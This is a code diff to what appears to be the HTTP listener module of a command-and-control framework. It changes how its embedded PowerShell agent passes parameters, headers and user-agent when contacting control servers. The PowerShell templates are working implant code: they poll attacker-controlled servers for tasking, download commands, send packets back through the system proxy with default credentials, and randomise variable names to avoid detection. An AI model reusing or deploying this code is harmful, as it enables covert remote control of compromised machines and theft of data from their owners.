@@ -418,12 +418,11 @@ class Listener:
            defaultResponse = b64DefaultResponse,
            UA = profile.split('|')[1],
            name = listenerOptions['Name']['Value'],
-           cookie = self.options['Cookie']['Value'],
            taskURIs = profile.split('|')[0])
 
                 updateServers = """
-                    $Script:ControlServers = @("%s");
-                    $Script:ServerIndex = 0;
+                    $ControlServers = @("%s");
+                    $ServerIndex = 0;
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
@@ -433,7 +432,7 @@ class Listener:
                         $ServerIndex = 0;
 
                         try {{
-                            if ($ControlServers[$Script:ServerIndex].StartsWith("http")) {{
+                            if ($ControlServers[$ServerIndex].StartsWith("http")) {{
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
@@ -451,7 +450,7 @@ class Listener:
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
-                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
+                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
                                 $result
                             }}
                         }}
@@ -467,7 +466,7 @@ class Listener:
 
                 sendMessage = """
                     $script:SendMessage{name} = {{
-                        param($Packets)
+                        param($Packets,$FixedParameters)
 
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
@@ -486,8 +485,8 @@ class Listener:
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $FixedParameters["headers"]["UserAgent"])
+                                $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
                                 try{{
                                     # get a random posting URI
